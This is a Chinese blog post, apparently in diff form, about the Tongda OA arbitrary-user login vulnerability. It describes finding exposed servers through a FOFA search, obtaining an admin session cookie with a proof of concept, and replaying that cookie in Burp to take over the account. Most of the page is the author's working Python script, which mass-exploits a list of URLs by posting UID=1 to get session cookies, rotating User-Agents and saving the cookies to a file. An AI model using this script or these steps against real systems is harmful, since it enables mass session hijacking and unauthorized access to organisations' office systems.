@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过构造的请求包进行任意用户伪造登录。 影响版本通达OA 2017版通达OA V11.X&lt;V11.5 漏洞利用fofa搜索关键字：app&#x3D;”通达OA”获取的链接可以使用github上的poc进行检测存在漏洞会">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通达OA任意用户登录漏洞">
+<meta property="og:url" content="https://mzzdtot.github.io/2020/05/22/tongda-oa/index.html">
+<meta property="og:site_name" content="Mzzd">
+<meta property="og:description" content="前言通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过构造的请求包进行任意用户伪造登录。 影响版本通达OA 2017版通达OA V11.X&lt;V11.5 漏洞利用fofa搜索关键字：app&#x3D;”通达OA”获取的链接可以使用github上的poc进行检测存在漏洞会">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/poc.png">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/renz.png">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/request.png">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/burp-cookie.png">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/login.png">
+<meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/pocscan.png">
+<meta property="article:published_time" content="2020-05-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-25T07:37:01.983Z">
+<meta property="article:author" content="作者">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/poc.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>通达OA任意用户登录漏洞</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/05/26/hydra/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/05/21/BlueLotus_XSSReceiver/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2020/05/22/tongda-oa/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&text=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&is_video=false&description=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=通达OA任意用户登录漏洞&body=Check out this article: https://mzzdtot.github.io/2020/05/22/tongda-oa/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&name=通达OA任意用户登录漏洞&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2020/05/22/tongda-oa/&t=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响版本"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复建议"><span class="toc-number">4.</span> <span class="toc-text">修复建议</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        通达OA任意用户登录漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Mzzd</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-21T16:00:00.000Z" itemprop="datePublished">2020-05-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。<br>该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过构造的请求包进行任意用户伪造登录。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>通达OA 2017版<br>通达OA V11.X&lt;V11.5</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>fofa搜索关键字：app=”通达OA”<br>获取的链接可以使用github上的poc进行检测<br>存在漏洞会回显cookie值<br>之后在请求包中替换cookie值实现任意用户登录</p>
+<p>github poc：<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
+<p>获取cookie<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/poc.png" alt="1"></p>
+<p>修改地址路径为/general/index.php访问<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/renz.png" alt="1"><br>提示未登录<br>burp-cookie<br>开启抓包，刷新页面<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/request.png" alt="3"><br>在请求头中修改cookie值为poc获取的cookie值</p>
+<p>在option中设置全局替换cookie<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/burp-cookie.png" alt="3"></p>
+<p>放包<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/login.png" alt="5"></p>
+<p>登录成功</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级通达 OA 到最新版</p>
+<p>ps：github上的脚本只是针对单个url的检测<br>我稍微修改了一下代码，在原poc上增加了for循环从txt中逐行读取url，可以进行批量检测</p>
+<p>以下为代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from random import choice</span><br><span class="line">import argparse</span><br><span class="line">import json</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">#use: python3 tongda-oa-scan.py oa.txt</span><br><span class="line">urllist &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">USER_AGENTS &#x3D; [</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident&#x2F;4.0; WOW64; Trident&#x2F;4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit&#x2F;523.15 (KHTML, like Gecko, Safari&#x2F;419.3) Arora&#x2F;0.3 (Change: 287 c9dfb30)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (X11; U; Linux; en-US) AppleWebKit&#x2F;527+ (KHTML, like Gecko, Safari&#x2F;419.3) Arora&#x2F;0.6&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko&#x2F;20070215 K-Ninja&#x2F;2.1.1&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko&#x2F;20080705 Firefox&#x2F;3.0 Kapiko&#x2F;3.0&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (X11; Linux i686; U;) Gecko&#x2F;20070322 Kazehakase&#x2F;0.4.5&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora&#x2F;1.9.0.8-1.fc10 Kazehakase&#x2F;0.5.6&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;535.11 (KHTML, like Gecko) Chrome&#x2F;17.0.963.56 Safari&#x2F;535.11&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit&#x2F;535.20 (KHTML, like Gecko) Chrome&#x2F;19.0.1036.7 Safari&#x2F;535.20&quot;,</span><br><span class="line">    &quot;Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;536.11 (KHTML, like Gecko) Chrome&#x2F;20.0.1132.11 TaoBrowser&#x2F;2.0 Safari&#x2F;536.11&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.1 (KHTML, like Gecko) Chrome&#x2F;21.0.1180.71 Safari&#x2F;537.1 LBBROWSER&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;535.11 (KHTML, like Gecko) Chrome&#x2F;17.0.963.84 Safari&#x2F;535.11 LBBROWSER&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser&#x2F;7.0.3698.400)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident&#x2F;4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows NT 5.1) AppleWebKit&#x2F;537.1 (KHTML, like Gecko) Chrome&#x2F;21.0.1180.89 Safari&#x2F;537.1&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.1 (KHTML, like Gecko) Chrome&#x2F;21.0.1180.89 Safari&#x2F;537.1&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit&#x2F;533.17.9 (KHTML, like Gecko) Version&#x2F;5.0.2 Mobile&#x2F;8C148 Safari&#x2F;6533.18.5&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko&#x2F;20110307 Firefox&#x2F;4.0b13pre&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko&#x2F;20100101 Firefox&#x2F;16.0&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.11 (KHTML, like Gecko) Chrome&#x2F;23.0.1271.64 Safari&#x2F;537.11&quot;,</span><br><span class="line">    &quot;Mozilla&#x2F;5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko&#x2F;20100922 Ubuntu&#x2F;10.10 (maverick) Firefox&#x2F;3.6.10&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers&#x3D;&#123;&#125;</span><br><span class="line"></span><br><span class="line">def getV11Session():</span><br><span class="line">    print(&#39;检测V11版本...&#39;)</span><br><span class="line">    t&#x3D;open(&quot;result.txt&quot;,&#39;w&#39;)</span><br><span class="line">    for url in open(urllist):</span><br><span class="line">        url &#x3D; url.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">        checkUrl &#x3D; url+&#39;&#x2F;general&#x2F;login_code.php&#39;</span><br><span class="line">        print(url)</span><br><span class="line">        try:</span><br><span class="line">            headers[&quot;User-Agent&quot;] &#x3D; choice(USER_AGENTS)</span><br><span class="line">            res &#x3D; requests.get(checkUrl,headers&#x3D;headers)</span><br><span class="line">            resText &#x3D; str(res.text).split(&#39;&#123;&#39;)</span><br><span class="line">            codeUid &#x3D; resText[-1].replace(&#39;&#125;&quot;&#125;&#39;, &#39;&#39;).replace(&#39;\r\n&#39;, &#39;&#39;)</span><br><span class="line">            getSessUrl &#x3D; url+&#39;&#x2F;logincheck_code.php&#39;</span><br><span class="line">            res &#x3D; requests.post(</span><br><span class="line">                getSessUrl, data&#x3D;&#123;&#39;CODEUID&#39;: &#39;&#123;&#39;+codeUid+&#39;&#125;&#39;, &#39;UID&#39;: int(1)&#125;,headers&#x3D;headers)</span><br><span class="line">            t.write(url+&#39;\n&#39;)</span><br><span class="line">            print(&#39;[+]Get Available COOKIE:&#39;+res.headers[&#39;Set-Cookie&#39;])</span><br><span class="line">            t.write(&#39;[+]Get Available COOKIE:&#39;+res.headers[&#39;Set-Cookie&#39;])</span><br><span class="line">        except:</span><br><span class="line">            print(&#39;[-]Something Wrong With &#39;+url)</span><br><span class="line">    t.close()</span><br><span class="line"></span><br><span class="line">def get2017Session():</span><br><span class="line">    print(&#39;检测V2017版本...&#39;)</span><br><span class="line">    t&#x3D;open(&quot;result.txt&quot;,&#39;w&#39;)</span><br><span class="line">    for url in open(urllist):</span><br><span class="line">        url &#x3D; url.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">        checkUrl &#x3D; url + &#39;&#x2F;ispirit&#x2F;login_code.php&#39;</span><br><span class="line">        print(url)</span><br><span class="line">        try:</span><br><span class="line">            headers[&quot;User-Agent&quot;] &#x3D; choice(USER_AGENTS)</span><br><span class="line">            res &#x3D; requests.get(checkUrl,headers&#x3D;headers)</span><br><span class="line">            resText &#x3D; json.loads(res.text)</span><br><span class="line">            codeUid &#x3D; resText[&#39;codeuid&#39;]</span><br><span class="line">            codeScanUrl &#x3D; url+&#39;&#x2F;general&#x2F;login_code_scan.php&#39;</span><br><span class="line">            res &#x3D; requests.post(codeScanUrl, data&#x3D;&#123;&#39;codeuid&#39;: codeUid, &#39;uid&#39;: int(</span><br><span class="line">                1), &#39;source&#39;: &#39;pc&#39;, &#39;type&#39;: &#39;confirm&#39;, &#39;username&#39;: &#39;admin&#39;&#125;,headers&#x3D;headers)</span><br><span class="line">            resText &#x3D; json.loads(res.text)</span><br><span class="line">            status &#x3D; resText[&#39;status&#39;]</span><br><span class="line">            if status &#x3D;&#x3D; str(1):</span><br><span class="line">                getCodeUidUrl &#x3D; url+&#39;&#x2F;ispirit&#x2F;login_code_check.php?codeuid&#x3D;&#39;+codeUid</span><br><span class="line">                res &#x3D; requests.get(getCodeUidUrl)</span><br><span class="line">                print(&#39;[+]Get Available COOKIE:&#39;+res.headers[&#39;Set-Cookie&#39;])</span><br><span class="line">                t.write(url+&#39;\n&#39;)</span><br><span class="line">                t.write(&#39;[+]Get Available COOKIE:&#39;+res.headers[&#39;Set-Cookie&#39;]+&#39;\n&#39;)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;[-]Something Wrong With &#39;+url)</span><br><span class="line">        except:</span><br><span class="line">            print(&#39;[-]Something Wrong With &#39;+url)</span><br><span class="line">    t.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    while 1:</span><br><span class="line">        show&#x3D;&#39;&#39;&#39;</span><br><span class="line">            1.检测版本2017</span><br><span class="line">            2.检测版本11</span><br><span class="line"></span><br><span class="line">        &#39;&#39;&#39;</span><br><span class="line">        print(show)</span><br><span class="line">        choose &#x3D; int(input(&#39;请输入&#39;))</span><br><span class="line">        if choose &#x3D;&#x3D; 1:</span><br><span class="line">            get2017Session()</span><br><span class="line">            break</span><br><span class="line">        elif choose &#x3D;&#x3D; 2:</span><br><span class="line">            getV11Session()</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;请重新输入&#39;)</span><br></pre></td></tr></table></figure>
+<p>1.以上保存为tongda-oa-scan.py<br>2.url列表保存在脚本同目录<br>运行：python tongda-oa-scan.py url列表名<br><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/tongda-oa-fakeuser/pocscan.png" alt="5"></p>
+<p>存在漏洞的url保存在同目录result.txt中</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响版本"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复建议"><span class="toc-number">4.</span> <span class="toc-text">修复建议</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2020/05/22/tongda-oa/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&text=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&is_video=false&description=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=通达OA任意用户登录漏洞&body=Check out this article: https://mzzdtot.github.io/2020/05/22/tongda-oa/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&title=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
